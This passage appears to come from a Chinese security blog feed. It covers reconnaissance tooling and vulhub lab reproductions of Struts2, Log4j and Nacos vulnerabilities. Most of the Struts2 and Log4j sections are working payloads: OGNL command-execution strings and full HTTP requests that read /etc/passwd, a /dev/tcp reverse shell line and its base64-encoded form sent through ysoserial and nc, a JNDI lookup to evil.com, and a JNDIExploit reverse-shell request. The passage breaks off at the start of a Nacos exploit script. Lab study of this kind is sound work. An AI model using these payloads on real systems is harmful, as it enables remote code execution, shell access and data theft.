href="https://blog.csdn.net/weixin_65582330/article/details/136433558,https://www.4hou.com/posts/Q1ol">https://blog.csdn.net/weixin_65582330/article/details/136433558,https://www.4hou.com/posts/Q1ol</a></p><p>不只通过简单的子域爆破，同时还会利用各种开放的互联网服务和资源，来协助其完成子域枚举任务，增加子域名爆破的成功率aquatone分为三个阶段:发现，扫描，收集</p><p><strong>aquatone-discover 发现</strong><br>通过获取google、shodan、censys、爆破等多种方式获取目标存在的域名常用语法:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aquatone-discover -d sangfor.com.cn -t 1</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241120174001455.png" alt="image-20241120174001455"></p><p><img src="/../image/image-20241120173928225.png" alt="image-20241120173928225"></p><p><strong>aquatone-scan 扫描</strong><br>经过发现阶段获取到域名，然后扫描域名主机存活和开放端口</p><p>常用语法:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aquatone-scan -d sangfor.com.cn -p&#x27;port&#x27;-t &#x27;threads</span><br></pre></td></tr></table></figure><p>discover没执行还执行不了这个。。。</p><p><strong>aquatone-gather 收集</strong><br>经过扫描以后发现存活的域名和端口，aquatone-gather将自动访问存活的域名并截图<br>常用语法:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aquatone-gather-dsangfor.com.cn</span><br></pre></td></tr></table></figure><h4 id="域传送"><a href="#域传送" class="headerlink" title="域传送"></a>域传送</h4><p>DNS区域传送(DNS zone transfer)指的是一台<strong>备用服务器使用来自主服务器</strong>的数据刷新自己的域(zone)数据库。为运行中的DNS服务提供了一定的冗余度，目的是为了防止主的域名服务器因意外故障变得不可用时影响到整个域名的解析。</p><p>DNS区域传送操作只在网络里真的有备用域名DNS服务器时才有必要用到，但许多DNS服务器却被错误地配置成只<strong>要有client发出请求，就会向对方提供一个zone数据库的详细信息</strong>，所以说允许不受信任的因特网用户执行DNS区域传送(zone transfer)</p><p><strong>危害</strong></p><p>黑客可以快速的判定出某个特定zone的所有主机，收集域信息，选择攻击目标找出未使用的IP地址，黑客可以绕过基于网络的访问控制</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dig @DnsServer axfr domain</span><br><span class="line">nslookup 进入交互-&gt;server dns domain -&gt;ls domain</span><br><span class="line">fierce -dns domain</span><br></pre></td></tr></table></figure><h4 id="在线网站"><a href="#在线网站" class="headerlink" title="在线网站"></a>在线网站</h4><ul><li><p><a href="http://www.virustotal.com/">www.virustotal.com</a></p></li><li><p>dnsdumpster.com</p></li><li><p>tool.chinaz.com</p></li></ul><h2 id="C段扫描"><a href="#C段扫描" class="headerlink" title="C段扫描"></a>C段扫描</h2><h3 id="C段扫描原因"><a href="#C段扫描原因" class="headerlink" title="C段扫描原因"></a>C段扫描原因</h3><ul><li>收集C段内部属于目标的IP地址</li><li>内部服务只限IP访问，没有映射域名</li><li>更多的探测主机目标资产</li></ul><h3 id="C段扫描-1"><a href="#C段扫描-1" class="headerlink" title="C段扫描"></a>C段扫描</h3><h4 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h4><p>nmap-扫描C段主机存活</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sn -PE -n 192.168.1.1/24</span><br></pre></td></tr></table></figure><ul><li><code>-sn</code> :不要扫描端口</li><li><code>-PE</code>:ICMP扫描</li><li><code>-n</code>:不进行dns解析</li></ul><p>nmap-定向端口扫描</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -Pn -p 3389 ip</span><br></pre></td></tr></table></figure><ul><li>-sS:半开放扫描</li><li>-Pn：不进行主句存活探测</li></ul><p>nmap-全端口扫描</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -Pn -p 1-65535 -n ip</span><br></pre></td></tr></table></figure><p>nmap-服务扫描</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -p 1-65535 -n ip</span><br></pre></td></tr></table></figure><h4 id="Masscan"><a href="#Masscan" class="headerlink" title="Masscan"></a>Masscan</h4><h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install git gcc make libpcap-dev(安装必备环境，kali已经默认安装完成)</span><br><span class="line">git clone https://github.com/robertdavidgraham/masscan</span><br><span class="line">cd masscan</span><br><span class="line">make(编译)</span><br></pre></td></tr></table></figure><h5 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">masscan -p 80 ip/24 --rate 10000 -oL output.txt</span><br></pre></td></tr></table></figure><ul><li>-p：设置端口</li><li>–rate：发包速率</li><li>-oL：输出位置</li></ul><p>为了绕过扫描特点ip，可以添加 –excludefile</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">masscan -p 80 ip --excludefile special.txt</span><br></pre></td></tr></table></figure><p>自定义多种格式输出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-oX XML</span><br><span class="line">-oJ JSON</span><br><span class="line">-oL list</span><br></pre></td></tr></table></figure><h5 id="注意问题"><a href="#注意问题" class="headerlink" title="注意问题"></a>注意问题</h5><p>扫描选项中必须添加端口 -p、–ports 1-65535</p><p>目标主机是ip地址、不是域名</p><h4 id="二者结合"><a href="#二者结合" class="headerlink" title="二者结合"></a>二者结合</h4><p>一般情况下，可以先使用masscan对目标IP(通常是一个网段)进行全端口扫描，然后再使用nmap对存活主机的开放端口进行扫描，找出对应端口服务存在的漏洞</p><p>使用masscan对目标IP进行扫描的原因就是因为其速度快于nmap。</p><h2 id="Web目录扫描"><a href="#Web目录扫描" class="headerlink" title="Web目录扫描"></a>Web目录扫描</h2>]]></content>
      
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulhub-Struts2</title>
      <link href="/2024/11/15/vulhub-Struts2/"/>
      <url>/2024/11/15/vulhub-Struts2/</url>
      
        <content type="html"><![CDATA[<h1 id="vuluhb-Struts2"><a href="#vuluhb-Struts2" class="headerlink" title="vuluhb-Struts2"></a>vuluhb-Struts2</h1><p>参考链接：</p><ul><li><p><a href="https://segmentfault.com/a/1190000013640141">https://segmentfault.com/a/1190000013640141</a></p></li><li><p><a href="https://blog.csdn.net/qq_44757034/article/details/106503557">https://blog.csdn.net/qq_44757034/article/details/106503557</a></p></li></ul><p>Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。Struts 2是Struts的下一代产品，是在 struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。其全新的Struts 2的体系结构与Struts 1的体系结构差别巨大。Struts 2以WebWork为核心，采用拦截器的机制来处理用户的请求，这样的设计也使得业务逻辑控制器能够与ServletAPI完全脱离开，所以Struts 2可以理解为WebWork的更新产品。</p><p>Struct2是基于MVC MVC 设计模式的WEB层框架。<br>Struct 2的内核相对于Struct1来讲已经发生了巨大的变化。</p><h2 id="S2-001"><a href="#S2-001" class="headerlink" title="S2-001"></a>S2-001</h2><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行</p><p>OGNL:</p><ul><li><a href="https://cloud.tencent.com/developer/article/1554322">https://cloud.tencent.com/developer/article/1554322</a></li><li><a href="https://dean2021.github.io/posts/struts2-internals-readbook-note_03/">https://dean2021.github.io/posts/struts2-internals-readbook-note_03/</a></li></ul><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>执行以下命令启动s2-001测试环境</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d </span><br></pre></td></tr></table></figure><p>获取tomcat执行路径：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;</span><br></pre></td></tr></table></figure><p>如果要直接在bp里改包，要注意修改url编码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /login.action;jsessionid=93FD46C6988DFC6864928892D3608D7F HTTP/1.1</span><br><span class="line">Host: 192.168.174.137:8080</span><br><span class="line">Content-Length: 118</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://192.168.174.137:8080</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://192.168.174.137:8080/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: JSESSIONID=93FD46C6988DFC6864928892D3608D7F</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">username=%25%7B%22tomcatBinDir%7B%22%2B%40java.lang.System%40getProperty%28%22user.dir%22%29%2B%22%7D%22%7D&amp;password=2</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241115162818363.png" alt="image-20241115162818363"></p><p>获取Web路径：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#x27;/&#x27;)),#response.flush(),#response.close()&#125;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241115162843863.png" alt="image-20241115162843863"></p><p>执行任意命令（命令加参数：<code>new java.lang.String[]&#123;&quot;cat&quot;,&quot;/etc/passwd&quot;&#125;</code>）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;,&quot;/etc/passwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241115163243084.png" alt="image-20241115163243084"></p><h2 id="S2-005"><a href="#S2-005" class="headerlink" title="S2-005"></a>S2-005</h2><h3 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>参考吴翰清的《白帽子讲Web安全》一书。</p><blockquote><p>s2-005漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为OGNL语句执行(可理解为java代码)。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\u0023)或8进制(\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开，S2-003的修补方案把自己上了一个锁，但是把锁钥匙给插在了锁头上</p></blockquote><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d //启动环境</span><br></pre></td></tr></table></figure><p>访问8080端口，查看服务</p><p><img src="/../image/image-20241116195457497.png" alt="image-20241116195457497"></p><p>POC：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redirect:$&#123;#req=#context.get(&#x27;co&#x27;+&#x27;m.open&#x27;+&#x27;symphony.xwo&#x27;+&#x27;rk2.disp&#x27;+&#x27;atcher.HttpSer&#x27;+&#x27;vletReq&#x27;+&#x27;uest&#x27;),#s=new java.util.Scanner((new java.lang.ProcessBuilder(&#x27;cat /etc/passwd&#x27;.toString().split(&#x27;\\s&#x27;))).start().getInputStream()).useDelimiter(&#x27;\\AAAA&#x27;),#str=#s.hasNext()?#s.next():&#x27;&#x27;,#resp=#context.get(&#x27;co&#x27;+&#x27;m.open&#x27;+&#x27;symphony.xwo&#x27;+&#x27;rk2.disp&#x27;+&#x27;atcher.HttpSer&#x27;+&#x27;vletRes&#x27;+&#x27;ponse&#x27;),#resp.setCharacterEncoding(&#x27;UTF-8&#x27;),#resp.getWriter().println(#str),#resp.getWriter().flush(),#resp.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><p>修改成post方法，要并注意url编码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /example/HelloWorld.action HTTP/1.1</span><br><span class="line">Host: 192.168.174.137:8080</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://192.168.174.137:8080/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: JSESSIONID=29AD3AF5D7907ED9EBC6BB80299C8BC1</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 666</span><br><span class="line"></span><br><span class="line">redirect:$&#123;%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%27.toString().split(%27\\s%27))).start().getInputStream()).useDelimiter(%27\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241116195545807.png" alt="image-20241116195545807"></p><h2 id="S2-007"><a href="#S2-007" class="headerlink" title="S2-007"></a>S2-007</h2><h3 id="漏洞成因-2"><a href="#漏洞成因-2" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>当配置了验证规则 <code>&lt;ActionName&gt;-validation.xml</code> 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回。例如这里有一个 UserAction：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">(...)</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserAction</span> <span class="keyword">extends</span> <span class="title class_">ActionSupport</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line"></span><br><span class="line">(...)</span><br></pre></td></tr></table></figure><p>然后配置有 UserAction-validation.xml：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">validators</span> <span class="keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">    <span class="string">&quot;-//OpenSymphony Group//XWork Validator 1.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">    <span class="string">&quot;http://www.opensymphony.com/xwork/xwork-validator-1.0.2.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">validators</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field-validator</span> <span class="attr">type</span>=<span class="string">&quot;int&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;min&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;max&quot;</span>&gt;</span>150<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">field-validator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">validators</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当用户提交 age 为字符串而非整形数值时，后端用代码拼接 <code>&quot;&#39;&quot; + value + &quot;&#39;&quot;</code> 然后对其进行 OGNL 表达式解析。要成功利用，只需要找到一个配置了类似验证规则的表单字段使之转换出错，借助类似 SQLi 注入单引号拼接的方式即可注入任意 OGNL 表达式。</p><p>因为受影响版本为 Struts2 2.0.0 - Struts2 2.2.3，所以这里给出绕过安全配置进行命令执行的 Payload（<strong>弹计算器，无法在本项目环境下运行</strong>）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@java.lang.Runtime@getRuntime().exec(&quot;open /Applications/Calculator.app&quot;)) + &#x27;</span><br></pre></td></tr></table></figure><p>我们可以用里面的war包来测试</p><h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>访问8080端口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())) + &#x27;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241120152850337.png" alt="image-20241120152850337"></p>]]></content>
      
      
      
        <tags>
            
            <tag> vulub </tag>
            
            <tag> Struts2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulhub-log4j</title>
      <link href="/2024/11/14/vulhub-log4j/"/>
      <url>/2024/11/14/vulhub-log4j/</url>
      
        <content type="html"><![CDATA[<h1 id="vulhub-log4j"><a href="#vulhub-log4j" class="headerlink" title="vulhub-log4j"></a>vulhub-log4j</h1><h2 id="CVE-2017-5645-反序列化RCE"><a href="#CVE-2017-5645-反序列化RCE" class="headerlink" title="CVE-2017-5645(反序列化RCE)"></a>CVE-2017-5645(反序列化RCE)</h2><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>Apache Log4j是一个用于Java的日志记录库，其支持启动远程日志服务器。Apache Log4j 2.8.2之前的2.x版本中存在安全漏洞。攻击者可利用该漏洞执行任意代码。</p><p>执行如下命令启动漏洞环境</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure><p>环境启动后，将在4712端口开启一个TCPServer。</p><p>说一下，除了使用vulhub的docker镜像搭建环境外，我们下载了log4j的jar文件后可以直接在命令行启动这个TCPServer：<code>java -cp &quot;log4j-api-2.8.1.jar:log4j-core-2.8.1.jar:jcommander-1.72.jar&quot; org.apache.logging.log4j.core.net.server.TcpSocketServer</code>，无需使用vulhub和编写代码。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -ano | grep 4712</span><br></pre></td></tr></table></figure><p>使用ysoserial生产payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-all.jar  CommonsCollections5 &quot;touch /tmp/susscess&quot; | nc 172.25.0.1 4712</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241114165626586.png" alt="image-20241114165626586"></p><p>反弹shell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sh -i &gt;&amp; /dev/tcp/192.168.174.137/8888 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>编码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -c &#123;echo,c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xNzQuMTM3Lzg4ODggMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-all.jar  CommonsCollections5 &quot;bash -c &#123;echo,c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xNzQuMTM3Lzg4ODggMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; | nc 172.25.0.1 4712</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241114170453750.png" alt="image-20241114170453750"></p><h3 id="CVE-2021-44228（JNDI注入）"><a href="#CVE-2021-44228（JNDI注入）" class="headerlink" title="CVE-2021-44228（JNDI注入）"></a>CVE-2021-44228（JNDI注入）</h3><h3 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>Apache Log4j 2 是Java语言的日志处理套件，使用极为广泛。在其2.0到2.14.1版本中存在一处JNDI注入漏洞，攻击者在可以控制日志内容的情况下，通过传入类似于<code>$&#123;jndi:ldap://evil.com/example&#125;</code>的lookup用于进行JNDI注入，执行任意代码。</p><p>参考链接：</p><ul><li><a href="https://logging.apache.org/log4j/2.x/security.html">https://logging.apache.org/log4j/2.x/security.html</a></li><li><a href="https://blog.csdn.net/weixin_43847838/article/details/122490319">https://blog.csdn.net/weixin_43847838/article/details/122490319</a></li></ul><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>Apache Log4j2 不是一个特定的Web服务，而仅仅是一个第三方库，我们可以通过找到一些使用了这个库的应用来复现这个漏洞，比如Apache Solr。</p><p>执行如下命令启动一个Apache Solr 8.11.0，其依赖了Log4j 2.14.1：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure><p>服务启动后，访问<code>http://your-ip:8983</code>即可查看到Apache Solr的后台页面。</p><p><img src="/../image/image-20241114171955776.png" alt="image-20241114171955776"></p><p><code>$&#123;jndi:dns://$&#123;sys:java.version&#125;.example.com&#125;</code>是利用JNDI发送DNS请求的Payload，我们将其作为管理员接口的action参数值发送如下数据包：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.zrmio0.dnslog.cn&#125; HTTP/1.1</span><br><span class="line">Host: 192.168.174.137:8983</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Referer: http://192.168.174.137:8983/solr/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241114172905401.png" alt="image-20241114172905401"></p><p><img src="/../image/image-20241114173423666.png" alt="image-20241114173423666"></p><p>反弹shell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.174.137</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /solr/admin/cores?action=$&#123;jndi:ldap://192.168.174.137:1389/Basic/ReverseShell/192.168.174.137/8888&#125; HTTP/1.1</span><br><span class="line">Host: 192.168.174.137:8983</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Referer: http://192.168.174.137:8983/solr/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241114175119426.png" alt="image-20241114175119426"></p>]]></content>
      
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> log4j </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulhub-nacos</title>
      <link href="/2024/11/07/vulhub-nacos/"/>
      <url>/2024/11/07/vulhub-nacos/</url>
      
        <content type="html"><![CDATA[<h1 id="vulhub-nacos"><a href="#vulhub-nacos" class="headerlink" title="vulhub-nacos"></a>vulhub-nacos</h1><p><a href="https://xz.aliyun.com/t/15151?u_atoken=a730da195c54967b1fed33a0489cba0b&amp;u_asig=1a0c399d17309641092626154e0153">https://xz.aliyun.com/t/15151?u_atoken=a730da195c54967b1fed33a0489cba0b&amp;u_asig=1a0c399d17309641092626154e0153</a></p><h2 id="什么是nacos"><a href="#什么是nacos" class="headerlink" title="什么是nacos"></a>什么是nacos</h2><p>Nacos 是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。致力于帮助发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，可以快速实现动态服务发现、服务配置、服务元数据及流量管理。</p><p><a href="https://nacos.io/zh-cn/docs/quick-start-spring.html">https://nacos.io/zh-cn/docs/quick-start-spring.html</a></p><h2 id="CVE-2021-29441（nacos认证绕过）"><a href="#CVE-2021-29441（nacos认证绕过）" class="headerlink" title="CVE-2021-29441（nacos认证绕过）"></a>CVE-2021-29441（nacos认证绕过）</h2><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>该漏洞发生在nacos在进行认证授权操作时，会判断请求的user-agent是否为”Nacos-Server”，如果是的话则不进行任何认证。开发者原意是用来处理一些服务端对服务端的请求。但是由于配置的过于简单，并且将协商好的user-agent设置为Nacos-Server，直接硬编码在了代码里，导致了漏洞的出现。并且利用这个未授权漏洞，攻击者可以获取到用户名密码等敏感信息。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 开启鉴权</span><br><span class="line">nacos.core.auth.enabled=true</span><br><span class="line">nacos.core.auth.system.type=nacos</span><br><span class="line"># 开启鉴权之后，你可以自定义用于生成JWT令牌的密钥  </span><br><span class="line"># The default token(Base64 String)</span><br><span class="line"># 自定义密钥时，推荐将配置项设置为Base64编码的字符串，且原始密钥长度不得低于32字符。  </span><br><span class="line">nacos.core.auth.default.token.secret.key=</span><br><span class="line"># 关闭使用user-agent判断服务端请求并放行鉴权的功能</span><br><span class="line">nacos.core.auth.enable.userAgentAuthWhite=false</span><br><span class="line"># 当以上两个属性这样如此设置时，以下两个属性生效</span><br><span class="line"># 配置自定义身份识别的key（不可为空）和value（不可为空）</span><br><span class="line"># 这两个属性是授权白名单，用于标识来自其他服务器的请求。</span><br><span class="line">nacos.core.auth.server.identity.key=nacosKey</span><br><span class="line">nacos.core.auth.server.identity.value=nacosValue</span><br></pre></td></tr></table></figure><p>参考链接：</p><ul><li><a href="https://github.com/advisories/GHSA-36hp-jr8h-556f">https://github.com/advisories/GHSA-36hp-jr8h-556f</a></li></ul><p>运行漏洞环境：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure><p>环境运行后，会开放3306、8848、9848、9555端口，在本次漏洞利用中，我们只需要用到8848端口，即web访问端口。<strong>执行漏洞验证过程时，请先访问8848端口，确认开放，某些情况下nacos服务会启动失败（无法连接数据库导致），可以重启nacos服务或者重启所有服务</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.174.137:8848/nacos/#/login</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241107161544907.png" alt="image-20241107161544907"></p><p>漏洞利用脚本</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span 